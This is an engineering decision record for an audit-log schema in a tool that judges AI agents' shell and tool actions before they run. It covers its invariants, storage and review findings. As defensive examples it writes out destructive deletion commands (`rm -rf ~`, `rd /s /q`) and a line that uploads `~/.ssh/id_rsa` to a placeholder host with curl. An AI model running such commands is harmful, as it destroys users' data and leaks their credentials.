# Decision Record

Status: designed and built in Week 16, part 1 (October 2026). Section 8
records what was verified after the build. Section 9 is the review log.

## 1. The problem in one paragraph

Every Sentinel verdict is written to the audit as an `AuditEvent`. The event
has fixed columns for *when, who, which session, allow or block*, and one
free-form `details: dict` for everything else. The nine places that write a
decision each put different keys in `details`. Nothing records what a shell
command *resolved to* (the path after `$DIR` collapsed to empty, the zone it
landed in, whether a glob was judged by its directory), and nothing records
*why* in a shape a program can read (which rule, which ceiling version, what
the agent was told). Gate 2b showed those facts are the whole value of the
floor. The Week 16 hook adapter is about to write thousands of these rows, and
the web monitor, the measurement harness, and the future hash chain all read
them. One typed shape, designed once, before the first row.

## 2. What already exists and is reused

| Existing | Role in the record |
|---|---|
| `AuditEvent` (`audit/models.py`) | Keeps the bookkeeping columns. Gains one optional field, `decision`. `details` stays for non-decision events and legacy rows. |
| `CanonicalAction` (`actions/models.py`) | Pre-pivot shape for *what was asked*: `family`, `tool`, `operation`, `raw_command`, `targets: list[str]`. Its `ActionFamily` literal is reused. Its string targets are the gap. |
| `AudienceSnapshot` (`platforms/models.py`) | The September Slack research: *what a send touches* is recipient count, external sharing, guests, broadcast. Reused as the source of the record's audience facts, not embedded (it enumerates up to 10,000 recipient ids; the audit row carries counts). |
| `AuditVerdict` literal | The four verdicts. Defined once in `sentinel.decisions` and re-exported by `audit.models`, so the two columns cannot disagree in type. |
| `redact()` (`audit/redaction.py`) | Runs on every row before persistence. Constrains field naming (§4.4) and defines the bytes the content hash covers (§5). |
| Gate 2b `Target` / `Finding` (spike) | The field list for shell facts (`raw`, `resolved`, `zone`, `kind`, `note`) and judgments (`verdict`, `rule`, `reason`). Promoted, not imported; the spike stays a spike. |

## 3. Design

Three nested models in a new package `sentinel.decisions`, plus one field on
`AuditEvent`.

```
AuditEvent
  └─ decision: DecisionRecord | None
       ├─ schema_version: 1
       ├─ action: ActionDescription            "what was asked, and what it touches"
       │    ├─ family, host, tool, raw, payload_sha256
       │    ├─ working_directory, working_directory_source: launch | hook_payload
       │    ├─ parse_status: parsed | unparseable | not_applicable
       │    ├─ opaque: list[str]               what the floor could not see inside
       │    └─ targets: list[ResolvedTarget]
       │         ├─ raw, kind (read|write|delete|execute|send|network)
       │         ├─ surface: filesystem | audience | resource
       │         ├─ filesystem: FilesystemFacts | None
       │         │     resolved, zone, judged_by: parser | directory | literal | windows_recognizer, note
       │         ├─ audience:   AudienceFacts   | None   counts + flags from AudienceSnapshot
       │         └─ resource:   ResourceFacts   | None   provider, resource_type, resource_id
       └─ judgment: Judgment                    "why"
            ├─ verdict, floor_verdict, decided_by (floor|ceiling|detector|model)
            ├─ rule_id, ceiling_version, enforcement (mandatory|advisory|unsupported)
            ├─ reason (person), agent_guidance (agent)
            ├─ history_facts: list[str]         "session:" prefixed, server-owned
            ├─ approval_reference, message: none | sent | suppressed_budget
            └─ latency_ms
```

### 3.1 Why `surface` with three facts blocks

The same row has to hold `rm -rf "$DIR"/*` (a filesystem path with a zone), a
future `slack.send` (an audience with a size), and today's fixture tools
(`sentinel_issue_add_note` on an issue id, which is neither). One `targets`
list with a discriminator keeps "what does it touch" in one column for every
reader. Exactly one facts block is present and it must match `surface`; this
is validated, not documented.

### 3.2 Why `floor_verdict` sits beside `verdict`

Core rule: a detector or model may escalate but never downgrade a floor
decision. Recording both makes that rule a validator and makes every row
self-evidently compliant to a reader, rather than trusting the writer. The one
legitimate downgrade is a server-owned approval: the floor said `confirm`, the
person approved, the row is `allow`. That row must cite `approval_reference`,
which is how the chain of evidence from "asked" to "approved" to "ran" stays
unbroken.

### 3.3 Why `enforcement` is on every row

Enforcement claims are per host and per surface. A `block` the host could not
enforce (advisory hook, agent-editable config) is a different fact from a
`block` that held. The harness counts them separately; the monitor shows them
differently. Putting the claim on the row keeps the honest coverage statement
attached to the evidence instead of in a footnote.

### 3.4 Why `judged_by` is on the target, not the judgment

Gate 2b's Windows incidents (`rd /s /q ""`) are judged by a recognizer that
runs *before* the shell parser; the parser never sees them. `time rm -rf ~`
is judged by a literal scan *after* the parser fails. Both produce a resolved
target with a real zone on a command the parser could not read. Provenance
belongs to the fact it describes, so a reader can tell "resolved by the
parser" from "matched by a recognizer" per target.

### 3.5 Why `message` is three-valued and `latency_ms` exists

Direction §6 measures messages to the person against the host's own prompts,
and false-flag tuning needs "would have messaged, but the budget silenced
it". A boolean loses the second case. Latency p50/p95 at the hook is also a
§6 number and has no other source than the row.

### 3.6 What is deliberately not in the record

- Message bodies, file contents, structured tool arguments. The row carries
  `payload_sha256` so an approval can bind to the exact call without the
  audit becoming a copy of the user's email. Raw shell text is kept (it is the
  command, not the data). Heredoc bodies are stripped by a validator on
  `raw`, not by writer convention, so two writers cannot diverge.
- Recipient id lists. Counts only (§2).
- The boundary. It is its own record in Week 16 part 2; the decision row will
  reference it by id when it exists. Adding the field now would be a guess.
- Hash chain fields (`previous_sha256`). Deferred past Week 18 by the
  Direction; the record exposes `content_sha256()` so the chain can be added
  without changing the row shape.
- The host's own permission prompts. A separate `host_prompt` event written by
  the adapter in part 3, if the transcript ever exposes them (Gate 1 found it
  does not today).

## 4. Invariants (validated in the model)

1. `ResolvedTarget`: exactly one of `filesystem`, `audience`, `resource` is set and it matches `surface`.
2. `FilesystemFacts`: `zone == "dynamic"` if and only if `resolved is None`.
3. `Judgment`: `block` and `confirm_required` require non-empty `agent_guidance` and a `rule_id`. (Core rule: the agent must be able to recover instead of retrying.)
4. `Judgment`: severity(`verdict`) ≥ severity(`floor_verdict`) when both are present. The single exception is the approved retry: `floor_verdict == "confirm_required"`, `verdict == "allow"`, `approval_reference` set, and `decided_by` not a detector or model. A floor `block` is never approvable; a detector never lowers anything. A `decided_by == "floor"` row cannot disagree with its own `floor_verdict`.
5. `Judgment`: `approval_reference` is permitted on `confirm_required` (asked), `allow` (consumed), and `block` (denied); never on `warn`.
6. `Judgment`: `decided_by ∈ {detector, model}` requires `floor_verdict` and `verdict ∈ {warn, confirm_required}`. (Core rule: detectors and the inferred boundary may raise warn or confirm, never allow or block.)
7. `ActionDescription`: `parse_status == "unparseable"` implies every filesystem target with a zone other than `dynamic` has `judged_by != "parser"`.
8. `Judgment.history_facts`: every entry starts with `session:`. (A writer cannot smuggle caller context in as history.)
9. `ActionDescription.raw`: heredoc bodies are stripped; length ≤ 32,000.
10. `AuditEvent`: when `decision` is present, `AuditEvent.verdict == decision.judgment.verdict`.
11. `DecisionRecord.content_sha256()` is computed over the canonical JSON of the record (sorted keys, compact separators) and is stable across serialization round-trips.
12. Field names never contain a redaction-sensitive substring. Tested by asserting `redact(record_dict) == record_dict` for a record with no secrets in values.

### 4.4 Naming constraint from redaction

`redact()` blanks the *value* of any key whose normalised name contains
`credential`, `secret`, `token`, `password`, `apikey`, `accesskey`,
`privatekey`, `authorization`, `cookie`, `sessiontoken`. The spike's
`credential_reads` would persist as `[REDACTED]`. Session facts are therefore
a list of strings under `history_facts` (values are not key-redacted), e.g.
`"session:credential_store_read"`. Zone values such as `"credential"` are
values, not keys, and survive.

`redact()` also blanks everything after `=` on an assignment line whose key
looks sensitive. `export AWS_SECRET_ACCESS_KEY=x && curl -T ~/.ssh/id_rsa
https://host` persists with the `curl` half gone from `raw`. This is
accepted: the structured `targets` (the `~/.ssh/id_rsa` read, the `network`
send) carry the verdict's evidence independently of `raw`, and a test holds
this exact case.

## 5. Storage, hash, and query

- `AuditEvent.decision` serialises into the existing `event_json` column; no
  second table. Two new columns on `audit_events`: `decision_rule_id TEXT`
  (indexed) and `decision_zones TEXT` (JSON array of zones touched). They are
  in `_create_events_table` for new databases. For existing databases they are
  added with `ALTER TABLE` **after** the legacy `sequence_id` migration, and
  the `OperationalError` "duplicate column name" is caught and ignored, so two
  processes opening the same database at once (two hook invocations) cannot
  put the store into degraded mode.
- **Content hash is over the persisted bytes.** `write()` redacts before
  storing, so a hash taken by the writer before redaction would never match a
  reader. `content_sha256()` is defined over the record's canonical JSON, and
  the test asserts hash(read-back record) == hash(redacted pre-write record).
- **Lenient read.** `_query_sqlite` re-validates each row with
  `extra: forbid`. If the `decision` block of a stored row fails validation (a
  future stricter schema, a hand-edited row), the row is returned with
  `decision=None` and the raw block preserved under
  `details["decision_unparsed"]`, instead of one bad row failing the whole
  query. A frozen v1 row is a test fixture.
- `AuditQuery` gains `rule_id` and `zone`. `rule_id` is an indexed equality.
  `zone` is answered in SQL with `EXISTS (SELECT 1 FROM
  json_each(decision_zones) WHERE value = ?)`; `json_each(NULL)` yields no
  rows, so legacy rows are correctly excluded. This is a full scan over
  non-null `decision_zones`; acceptable for a local database and stated here.
- `_matches` (the in-memory fallback filter) gets its own branch for `zone`
  (list membership) and `rule_id`, so degraded reads agree with persisted
  reads.
- The control API `/audit` route exposes `rule_id` and `zone` as optional
  query parameters. `AuditListResponse` already returns `AuditEvent`, so the
  web types regenerate with `decision` present. The TypeScript `surface`
  union will not narrow (the generator emits `anyOf` as a plain union); the
  monitor must check `surface` and then the matching block, which is what the
  validator guarantees anyway.

## 6. Writers in this part

- **MCP gateway** `_write_decision`: builds a `DecisionRecord` with
  `surface="resource"` from `McpDecision` and `McpActionFacts`, with
  `enforcement` taken from the gateway's coverage status rather than
  hardcoded. The record is built **inside** the existing try, and *any*
  exception (not only `AuditStoreError`) falls back to writing the legacy
  `details` row. Admission is untouched; a test asserts an invalid record
  still returns the same `McpCallResponse`.
- **Shell**: no live writer yet (the hook adapter is part 3). The fit is
  proved by tests that build records for every Gate 2b incident from the
  spike's output when `bashlex` is installed, and from literal fixtures when
  it is not.

Not changed: `main.py` shell-path events, `pre_decision` / `post_execution`
events. They keep `details`; migrating them is not on the critical path and
the fixture path is bench-only.

## 7. Assumptions

| Assumption | Status | How checked |
|---|---|---|
| Pydantic 2.14 `field_validator` / `model_validator` (v2 style, used for the new package) coexist with the v1-style validators elsewhere | verified | tests run on 2.14 |
| SQLite in the project interpreter has JSON1 | verified | `json_valid` returns 1 on 3.53.4 |
| `redact()` leaves the record's structure intact | verified by test | invariant 12 |
| Gate 2b incidents all fit the shape with no lossy field | verified by test | one record per incident, asserted fields |
| `AudienceSnapshot` → `AudienceFacts` loses nothing the §10 intent layer needs | **unverified**; the intent-layer gate (Direction §10) decides | recorded as open; the conversion is one function and cheap to extend |
| The hook adapter will not need a field this part did not foresee | **unverified** until part 3 | `schema_version` exists so a v2 is additive; lenient read means a v2 never breaks a v1 reader |

Kill condition for this part: a Gate 2b incident whose facts cannot be
expressed without a free-form dict.

## 8. Verified after the build

Built October 10, 2026. 36 new tests across four files; the full suite is
672 passing. Verified:

| Claim | How |
|---|---|
| Every Gate 2b incident (15) and hard twin (69) fits the record with no free-form dict | `test_decision_record_gate2b_fit.py` runs the spike floor and builds a record per case; each round-trips through JSON with a stable hash. Kill condition not triggered. The two Replit cases (`F8`) fit as `surface="resource"` (a database), which is what the resource block is for. |
| A Slack send fits via `AudienceFacts.from_snapshot` with counts only | `test_slack_send_fits_via_audience_facts_from_snapshot`: 212 recipients, 2 external, 1 guest; no recipient id in the canonical JSON. |
| The live MCP path writes a typed record; a record that cannot be built never changes the response and never loses the legacy row | `test_gateway_decision_record.py`, including a forced `RuntimeError` inside the builder. |
| Invariants 1–12 reject what they should and accept the approved retry | `test_decision_record.py::InvariantTests`, one test per invariant. |
| Existing databases gain the columns without a row rewrite; two openers racing on `ALTER TABLE` do not degrade the store | `test_decision_record_store.py` with a `sqlite3.Connection` subclass that lets "the other process" win first. |
| `zone` and `rule_id` filters agree between SQL and the in-memory fallback; `json_each(NULL)` and malformed `decision_zones` exclude the row rather than erroring | same file. |
| Hash is over persisted bytes | writer hash ≠ pre-redaction hash, reader hash == redacted hash. |
| Redaction growth on any bounded field clamps rather than demotes | the clamp is driven by pydantic's own `string_too_long` error locations, so it cannot fall behind the schema. |
| Heredoc stripping follows bash: `<<-` tabs, quoted and odd delimiters, CRLF, unterminated-runs-to-end, strip-before-truncate; `'<<X'` and `<<<` are not heredocs; linear time on 8,000 openers | `test_9_heredoc_bodies_are_stripped_in_the_model`. |
| Web types regenerate and the app typechecks | `generate_control_types.py --check`, `tsc --noEmit`. |

Not verified: a live shell writer (part 3); the Windows `judged_by` value is
set by the test bridge, not by a shipped recognizer; the `AudienceFacts`
conversion against a real intent-layer gate (§7).

Not changed, on purpose: `main.py` shell-path events and the web audit page
still read `details`. The page renders `decision` as part of the event JSON
but has no dedicated view yet; that is monitor work, after the adapter
produces real rows.

## 9. Review log

**Plan review, October 10.** Independent critique found 18 items. Must-fixes
accepted: no latency field (§3.5); invariant 4 rejected the approved retry
and invariant 5 forbade citing the approval on the consuming row (§3.2, §4.4,
§4.5); the Windows incidents are judged before the parser, so provenance
moved from the rule id to the target (§3.4, §4.7); the gateway writer could
raise a `ValidationError` past the `AuditStoreError` handler and break
admission (§6); `ALTER TABLE` on open raced between processes (§5).
Should-fixes accepted: hash over persisted bytes, lenient read, detector rows
constrained to warn/confirm, `working_directory_source`, `session:` prefix,
three-valued `message`, heredoc stripping in the model, `AuditEvent.verdict`
tied to the record, zone filter in the fallback matcher, v2-style validators.
Deferred: `host_prompt` event (adapter work, part 3).

**Code review, October 10.** Three independent passes.

- *Bugbot:* the heredoc stripper deleted the rest of the operator line
  (`> .env`, `| sudo tee`), which is the evidence saying where the data went.
  Fixed; the test now asserts the operator line survives.
- *Security review:* no medium or higher. Two low notes, both fixed before
  the shell writer makes them reachable: redaction could grow `raw` past its
  limit and silently demote the typed record (a blocked decision would vanish
  from zone queries); the heredoc regex ran before the length cap with a
  quadratic worst case in a per-action hook.
- *Correctness pass on validators and store:* three must-fixes. (1) The
  approval exception to invariant 4 was unconditional, so a detector could
  lower a floor `block` to `confirm` by carrying an `approval_reference`; the
  exception is now exactly one shape (floor `confirm_required` → `allow`,
  not decided by a detector or model) and a floor row cannot contradict its
  own `floor_verdict`. (2) Truncation ran before heredoc stripping, so the
  largest heredocs, whole files, were the ones whose bodies survived. (3)
  `<<-` never stripped because the tab rule was ignored. Should-fixes taken:
  blank `rule_id` on a block, `latency_ms=inf` producing non-JSON, malformed
  `decision_zones` escaping `query()` as a raw sqlite error, clamping only
  three of nine bounded fields (now derived from pydantic's error locations),
  and the "linear" scan that was quadratic on unterminated openers.

Accepted and noted, not changed: a row whose decision is demoted on read
drops out of `rule_id`/`zone` filtered views while remaining in unfiltered
ones (the demotion is recorded in `details["decision_unparsed_error"]`);
`FilesystemFacts.resolved=""` is allowed as a resolution distinct from `None`.
